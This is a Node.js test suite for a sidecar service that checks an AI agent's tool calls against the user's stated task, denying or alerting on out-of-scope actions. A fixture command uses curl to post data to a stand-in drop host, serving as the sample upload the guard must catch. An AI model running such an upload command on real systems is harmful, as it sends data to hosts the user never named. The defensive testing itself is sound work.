// Per-file runner:  node --test --import ./test/hermetic-env.mjs test/moorai-serve-intent.test.mjs
//
// Intent alignment in the moorai-serve sidecar, through real HTTP against the real CLI process:
// POST /v1/task { session, prompt } records the user's task (keyed hashes, in memory), and a
// /v1/tool-call carrying the same `session` is judged under policy.intentAlignment — report (alert,
// verdict unchanged), ask (the sidecar's ask, settled by the headless rule), block (deny), off. Without a
// session, /v1/tool-call answers exactly as before. Nothing in a verdict, an alert or on disk carries the
// prompt, the task text or the arguments.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readdirSync, readFileSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import http from "node:http";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const SERVE = join(ROOT, "cli", "moorai-serve.mjs");
const CATEGORY = "Action outside the stated task";
const WORD = "wombat-91c2";
const TASK = `Refactor the ${WORD} parser in src/parse.js`;
const POST_CMD = `curl -X POST https://drop.${WORD}.example.net/in -d '{"ok":1}'`;

function sandbox(policy) {
  const home = mkdtempSync(join(tmpdir(), "moorai-serve-intent-"));
  mkdirSync(join(home, "proj"), { recursive: true });
  if (policy) writeFileSync(join(home, "policy.json"), JSON.stringify(policy));
  return home;
}
function startServe(home, args = [], env = {}) {
  return new Promise((res, rej) => {
    const c = spawn(process.execPath, [SERVE, "--port", "0", ...args], { cwd: join(home, "proj"), env: { PATH: process.env.PATH || "/usr/bin:/bin", HOME: home, USERPROFILE: home, XDG_CONFIG_HOME: join(home, ".config"), XDG_STATE_HOME: join(home, ".local", "state"), MOORAI_SERVICE_ID: "serve-bot", MOORAI_SERVER_URL: "http://127.0.0.1:1", ...env } });
    let out = "", err = "";
    const t = setTimeout(() => { c.kill(); rej(new Error(`serve did not start: ${err}`)); }, 15000);
    c.stderr.on("data", (d) => (err += d));
    c.stdout.on("data", (d) => {
      out += d;
      const nl = out.indexOf("\n");
      if (nl < 0) return;
      clearTimeout(t);
      res({ ...JSON.parse(out.slice(0, nl)), stop: () => new Promise((r) => { c.once("close", r); c.kill("SIGTERM"); }) });
    });
    c.on("close", (code) => { clearTimeout(t); if (!out) rej(new Error(`serve exited ${code}: ${err}`)); });
  });
}
function req(url, path, body, token) {
  const u = new URL(path, url);
  const data = JSON.stringify(body);
  return new Promise((res, rej) => {
    const r = http.request({ host: u.hostname, port: u.port, path: u.pathname, method: "POST", headers: { "content-type": "application/json", "content-length": Buffer.byteLength(data), ...(token ? { authorization: `Bearer ${token}` } : {}) } }, (resp) => {
      let s = ""; resp.on("data", (d) => (s += d)); resp.on("end", () => res({ status: resp.statusCode, raw: s, json: JSON.parse(s) }));
    });
    r.on("error", rej);
    r.end(data);
  });
}
async function fakeConsole() {
  const alerts = [];
  const srv = http.createServer((q, r) => { let b = ""; q.on("data", (d) => (b += d)); q.on("end", () => { if (q.url === "/api/alerts") alerts.push(b); r.writeHead(q.url.startsWith("/api/policy") ? 404 : 201); r.end("{}"); }); });
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  return { alerts, env: { MOORAI_SERVER_URL: `http://127.0.0.1:${srv.address().port}`, MOORAI_INSTALL_TOKEN: "tok-serve-intent-1", MOORAI_TENANT: "t-serve" }, close: () => srv.close() };
}
async function withServe(policy, fn, { args = [], tokens, taskTokens } = {}) {
  const con = await fakeConsole();
  const home = sandbox(policy);
  if (tokens) writeFileSync(join(home, "tokens"), tokens.join("\n") + "\n");
  if (taskTokens) writeFileSync(join(home, "task-tokens"), taskTokens.join("\n") + "\n");
  let s = null, stopped = false;
  const stop = async () => { if (s && !stopped) { stopped = true; await s.stop(); } };
  try {
    s = await startServe(home, [...(policy ? ["--policy-file", join(home, "policy.json")] : []), ...(tokens ? ["--token-file", join(home, "tokens")] : []), ...(taskTokens ? ["--task-token-file", join(home, "task-tokens")] : []), ...args], con.env);
    await fn({ url: s.listening, con, home, stop });
  } finally { await stop(); con.close(); rmTree(home); }
}
const intentAlerts = (con) => con.alerts.map((b) => JSON.parse(b)).filter((a) => a.category === CATEGORY);

test("POST /v1/task: validates, answers with counts only, never echoes the prompt", async () => {
  await withServe({ captureTier: "content-free" }, async ({ url }) => {
    assert.equal((await req(url, "/v1/task", { prompt: TASK })).status, 400, "session is required");
    assert.equal((await req(url, "/v1/task", { session: "s1" })).status, 400, "prompt is required");
    assert.equal((await req(url, "/v1/task", { session: "s1", prompt: 7 })).status, 400);
    assert.equal((await req(url, "/v1/task", { session: "x".repeat(257), prompt: TASK })).status, 400);
    const r = await req(url, "/v1/task", { session: "s1", prompt: TASK });
    assert.equal(r.status, 200);
    assert.equal(r.json.mode, "report");
    assert.equal(r.json.captured, true);
    assert.ok(r.json.features > 0);
    assert.deepEqual(Object.keys(r.json).sort(), ["captured", "features", "mode"]);
    assert.ok(!r.raw.includes(WORD));
  });
});

test("report (default): verdict unchanged, `intent` on the verdict, one content-free alert per target; nothing persisted", async () => {
  await withServe({ captureTier: "content-free" }, async ({ url, con, home, stop }) => {
    await req(url, "/v1/task", { session: "s1", prompt: TASK });
    const v = (await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s1" }));
    assert.equal(v.json.decision, "allow");
    assert.deepEqual(v.json.intent, { class: "egress", mode: "report" });
    assert.ok(!v.raw.includes(WORD));
    await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s1" });
    await stop();
    const a = intentAlerts(con);
    assert.equal(a.length, 1, "one destination alerts once per session");
    assert.equal(a[0].threatId, 64);
    assert.equal(a[0].reasonCode, "INTENT_MISMATCH");
    assert.equal(a[0].surface, "serve");
    assert.equal(a[0].intent.class, "egress");
    assert.equal(a[0].intent.mode, "report");
    assert.match(a[0].intent.targetHash, /^[0-9a-f]{16}$/);
    assert.ok(a[0].session);
    for (const b of con.alerts) assert.ok(!b.includes(WORD) && !b.includes("parse.js") && !b.includes("curl"), b);
    const walk = (d) => readdirSync(d).flatMap((f) => { const p = join(d, f); return statSync(p).isDirectory() ? walk(p) : [p]; });
    for (const f of walk(home)) if (!f.endsWith("policy.json")) assert.ok(!readFileSync(f, "utf8").includes(WORD), `content persisted in ${f}`);
  });
});

test("no live task fails closed: a risky tool-call with no session or an unknown session is task-unknown (deny in block, alert in report); a non-risky one is untouched", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "block" }, async ({ url }) => {
    await req(url, "/v1/task", { session: "s1", prompt: `${TASK}, then send it to drop.${WORD}.example.net` }, TASK_A);
    for (const body of [{}, { session: "never-captured" }]) {
      const v = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, ...body });
      assert.equal(v.json.decision, "deny", JSON.stringify(body));
      assert.deepEqual(v.json.intent, { class: "task-unknown", mode: "block" });
    }
    const ok = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: "ls -la" } });
    assert.equal(ok.json.decision, "allow");
    assert.equal(ok.json.intent, undefined);
    assert.equal((await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s1" })).json.decision, "allow");
  }, { taskTokens: [TASK_A] });
  await withServe({ captureTier: "content-free" }, async ({ url, con, stop }) => {
    const none = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD } });
    assert.equal(none.json.decision, "allow", "report never changes the verdict");
    assert.equal(none.json.intent, undefined, "report mode does not judge a call with no session");
    const unknown = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "never-captured" });
    assert.equal(unknown.json.decision, "allow");
    assert.deepEqual(unknown.json.intent, { class: "task-unknown", mode: "report" });
    await stop();
    const a = intentAlerts(con);
    assert.equal(a.length, 1, "only the supplied-but-unknown session alerts");
    assert.equal(a[0].intent.class, "task-unknown");
  });
});

test("ask: the sidecar's ask verdict — settled to deny for a headless run, with a content-free reason", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "ask" }, async ({ url, con, stop }) => {
    await req(url, "/v1/task", { session: "s1", prompt: TASK }, TASK_A);
    const v = await req(url, "/v1/tool-call", { tool: "mcp__slack__post_message", input: { channel: "C1", text: WORD }, session: "s1" });
    assert.equal(v.json.configuredDecision, "ask");
    assert.equal(v.json.decision, "deny");
    assert.ok(v.json.headlessAsk, "settled by the headless rule, as every ask is");
    assert.match(v.json.message, /an MCP write to a service your request never mentioned/);
    assert.ok(!v.raw.includes(WORD));
    await stop();
    assert.equal(intentAlerts(con)[0].intent.mode, "ask");
  }, { taskTokens: [TASK_A] });
});

test("block: deny with a content-free reason; aligned calls pass", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "block" }, async ({ url, con, stop }) => {
    await req(url, "/v1/task", { session: "s1", prompt: TASK }, TASK_A);
    const v = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s1" });
    assert.equal(v.json.decision, "deny");
    assert.equal(v.json.configuredDecision, "deny");
    assert.deepEqual(v.json.intent, { class: "egress", mode: "block" });
    assert.match(v.json.message, /action outside the stated task — an upload to a host your request never mentioned/);
    assert.ok(!v.raw.includes(WORD));
    await req(url, "/v1/task", { session: "s2", prompt: `${TASK}, then send the result to drop.${WORD}.example.net` }, TASK_A);
    assert.equal((await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s2" })).json.decision, "allow");
    await stop();
    const a = intentAlerts(con);
    assert.equal(a.length, 1);
    assert.equal(a[0].riskLevel, "Blocked");
  }, { taskTokens: [TASK_A] });
});

test("off: /v1/task captures nothing and tool calls are not judged", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "off" }, async ({ url, con, stop }) => {
    assert.deepEqual((await req(url, "/v1/task", { session: "s1", prompt: TASK })).json, { mode: "off", captured: false, features: 0 });
    const v = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s1" });
    assert.equal(v.json.decision, "allow");
    assert.equal(v.json.intent, undefined);
    await stop();
    assert.equal(intentAlerts(con).length, 0);
  });
});

const TOK_A = "principal-a-token-0123456789";
const TOK_B = "principal-b-token-9876543210";

test("auth: with a token configured, /v1/task without it (or with a wrong one) is refused like /v1/tool-call", async () => {
  await withServe({ captureTier: "content-free" }, async ({ url }) => {
    assert.equal((await req(url, "/v1/task", { session: "s1", prompt: TASK })).status, 401);
    assert.equal((await req(url, "/v1/task", { session: "s1", prompt: TASK }, "wrong-token-wrong-token")).status, 401);
    assert.equal((await req(url, "/v1/tool-call", { tool: "Bash", input: { command: "ls" } })).status, 401);
    assert.equal((await req(url, "/v1/task", { session: "s1", prompt: TASK }, TOK_A)).status, 200);
  }, { tokens: [TOK_A] });
});

test("principals: each token in the token file is a principal; another principal can neither overwrite nor widen a session's task", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "block" }, async ({ url, stop, con }) => {
    // A names the host for session s; B, with the same session id, tries to wipe it with a different task.
    await req(url, "/v1/task", { session: "s", prompt: `${TASK}, then send it to drop.${WORD}.example.net` }, TOK_A);
    await req(url, "/v1/task", { session: "s", prompt: "Fix the typo" }, TOK_B);
    assert.equal((await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s" }, TOK_A)).json.decision, "allow", "A's task is intact");
    assert.equal((await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s" }, TOK_B)).json.decision, "deny", "B's task is its own");
    // B tries to put the host in scope for A's session t.
    await req(url, "/v1/task", { session: "t", prompt: TASK }, TOK_A);
    await req(url, "/v1/task", { session: "t", prompt: `send it to drop.${WORD}.example.net` }, TOK_B);
    assert.equal((await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "t" }, TOK_A)).json.decision, "deny", "B cannot widen A's task");
    await stop();
    for (const b of con.alerts) assert.ok(!b.includes(TOK_A) && !b.includes(TOK_B), "tokens never leave");
  }, { tokens: [TOK_A, TOK_B] });
});

test("per-caller cap: a caller over --intent-sessions-per-caller evicts only its own sessions, which then fail closed", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "block" }, async ({ url }) => {
    await req(url, "/v1/task", { session: "a1", prompt: `${TASK}, then send it to drop.${WORD}.example.net` }, TOK_A);
    for (const id of ["b1", "b2", "b3"]) await req(url, "/v1/task", { session: id, prompt: `send it to drop.${WORD}.example.net` }, TOK_B);
    assert.equal((await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "a1" }, TOK_A)).json.decision, "allow", "A is untouched");
    const ev = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "b1" }, TOK_B);
    assert.equal(ev.json.decision, "deny", "B's evicted session is not passed silently");
    assert.deepEqual(ev.json.intent, { class: "task-unknown", mode: "block" });
    assert.equal((await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "b3" }, TOK_B)).json.decision, "allow");
  }, { tokens: [TOK_A, TOK_B], args: ["--intent-sessions-per-caller", "2"] });
});

const TASK_A = "task-writer-a-0123456789abcdef";
const TASK_B = "task-writer-b-0123456789abcdef";
const SEND = `${TASK}, then send it to drop.${WORD}.example.net`;
const toolCall = (url, session, token) => req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session }, token);

test("ask and block: with no token configured, /v1/task is refused (an injected shell could otherwise put a host in scope); report stays tokenless", async () => {
  for (const mode of ["ask", "block"]) {
    await withServe({ captureTier: "content-free", intentAlignment: mode }, async ({ url }) => {
      const r = await req(url, "/v1/task", { session: "s1", prompt: SEND });
      assert.equal(r.status, 403, `${mode}: ${r.raw}`);
      assert.match(r.json.error, /--task-token-file/);
      assert.equal((await toolCall(url, "s1")).json.decision, "deny", `${mode}: the refused task put nothing in scope`);
    });
  }
  await withServe({ captureTier: "content-free" }, async ({ url }) => {
    assert.equal((await req(url, "/v1/task", { session: "s1", prompt: SEND })).status, 200, "report mode needs no token");
  });
});

test("task-writer role: with --task-token-file, a /v1/tool-call token cannot set a task; only the task token can, and its task is judged for the paired principal", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "block" }, async ({ url }) => {
    for (const [tok, status] of [[TOK_A, 403], [undefined, 401], ["wrong-token-wrong-token", 401]]) {
      const r = await req(url, "/v1/task", { session: "s", prompt: SEND }, tok);
      assert.equal(r.status, status, `${tok}: ${r.raw}`);
    }
    assert.match((await req(url, "/v1/task", { session: "s", prompt: SEND }, TOK_A)).json.error, /task-writer/);
    assert.equal((await toolCall(url, "s", TOK_A)).json.decision, "deny", "the tool-call token's attempt put nothing in scope");
    const r = await req(url, "/v1/task", { session: "s", prompt: SEND }, TASK_A);
    assert.equal(r.status, 200, r.raw);
    assert.equal(r.json.captured, true);
    assert.equal((await toolCall(url, "s", TOK_A)).json.decision, "allow", "line 1 of --task-token-file writes for line 1 of --token-file");
    assert.equal((await toolCall(url, "s", TOK_B)).json.decision, "deny", "and for no other principal");
    await req(url, "/v1/task", { session: "t", prompt: TASK }, TASK_A);
    assert.equal((await req(url, "/v1/task", { session: "t", prompt: SEND }, TOK_A)).status, 403);
    assert.equal((await req(url, "/v1/task", { session: "t", prompt: SEND }, TASK_B)).status, 200);
    assert.equal((await toolCall(url, "t", TOK_A)).json.decision, "deny", "neither the tool-call token nor another principal's task token widens A's task");
    assert.equal((await toolCall(url, "t", TOK_B)).json.decision, "allow");
  }, { tokens: [TOK_A, TOK_B], taskTokens: [TASK_A, TASK_B] });
});

test("task token alone (no --token-file): the agent's tool calls need no token, but /v1/task needs the task token", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "block" }, async ({ url }) => {
    assert.equal((await req(url, "/v1/task", { session: "s", prompt: SEND })).status, 403);
    assert.equal((await toolCall(url, "s")).json.decision, "deny");
    assert.equal((await req(url, "/v1/task", { session: "s", prompt: SEND }, TASK_A)).status, 200);
    assert.equal((await toolCall(url, "s")).json.decision, "allow");
  }, { taskTokens: [TASK_A] });
});

test("task-token arguments: one task token per --token-file line, never equal to a tool-call token; a task token alone does not open a remote bind", async () => {
  const { parseArgs } = await import(pathToFileURL(SERVE).href);
  const home = sandbox();
  try {
    const f = (name, lines) => { writeFileSync(join(home, name), lines.join("\n")); return join(home, name); };
    const calls = f("calls", [TOK_A, TOK_B]);
    assert.deepEqual(parseArgs(["--token-file", calls, "--task-token-file", f("tasks", [TASK_A, TASK_B])], {}).taskTokens, [TASK_A, TASK_B]);
    assert.throws(() => parseArgs(["--token-file", calls, "--task-token-file", f("one", [TASK_A])], {}), /one task token per --token-file line/);
    assert.throws(() => parseArgs(["--token-file", calls, "--task-token-file", f("same", [TASK_A, TOK_B])], {}), /must differ from every --token-file token/);
    assert.throws(() => parseArgs(["--host", "10.0.0.5", "--allow-remote", "--task-token-file", f("t", [TASK_A])], {}), /without a token/);
    assert.deepEqual(parseArgs([], { MOORAI_SERVE_TASK_TOKEN: TASK_A }).taskTokens, [TASK_A]);
  } finally { rmTree(home); }
});

test("five principals at the per-caller cap: a new principal's session never evicts another principal's (the global cap is sized principals x per-caller)", async () => {
  const { createServer } = await import(pathToFileURL(SERVE).href);
  const toks = [TOK_A, TOK_B, "principal-c-token-0123456789", "principal-d-token-0123456789", "principal-e-token-0123456789"];
  const s = await createServer({ port: 0, tokens: toks, policy: { captureTier: "content-free", intentAlignment: "block" } });
  try {
    for (const [i, tok] of toks.slice(0, 4).entries()) {
      for (let n = 0; n < 256; n++) await s.runtime.captureTask(`p${i}-${n}`, SEND, tok);
    }
    const e = await req(s.url, "/v1/task", { session: "e0", prompt: SEND }, toks[4]);
    assert.equal(e.status, 200, e.raw);
    assert.equal((await toolCall(s.url, "e0", toks[4])).json.decision, "allow", "the fifth principal's session is held");
    for (const [i, tok] of toks.slice(0, 4).entries()) {
      const v = await toolCall(s.url, `p${i}-0`, tok);
      assert.equal(v.json.decision, "allow", `principal ${i}'s oldest session survived: ${v.raw}`);
    }
  } finally { await s.close(); }
});

test("a task written without a token in report mode is not honoured once the effective mode becomes block: the risky call is task-unknown", async () => {
  const { createServer } = await import(pathToFileURL(SERVE).href);
  const policy = { captureTier: "content-free" };
  const s = await createServer({ port: 0, policy });
  try {
    const t = await req(s.url, "/v1/task", { session: "s1", prompt: SEND });
    assert.equal(t.status, 200, "report mode accepts a tokenless task");
    assert.deepEqual((await toolCall(s.url, "s1")).json.intent, undefined, "report: aligned while unauthenticated writes count");
    policy.intentAlignment = "block";
    const v = await toolCall(s.url, "s1");
    assert.equal(v.json.decision, "deny", v.raw);
    assert.deepEqual(v.json.intent, { class: "task-unknown", mode: "block" });
    policy.intentAlignment = "report";
    assert.deepEqual((await toolCall(s.url, "s1")).json.intent, undefined, "report mode is unchanged");
  } finally { await s.close(); }
  const p2 = { captureTier: "content-free" };
  const a = await createServer({ port: 0, policy: p2, tokens: [TOK_A] });
  try {
    await req(a.url, "/v1/task", { session: "s1", prompt: SEND }, TOK_A);
    p2.intentAlignment = "block";
    assert.equal((await toolCall(a.url, "s1", TOK_A)).json.decision, "allow", "a task written with a token is honoured in block");
  } finally { await a.close(); }
});
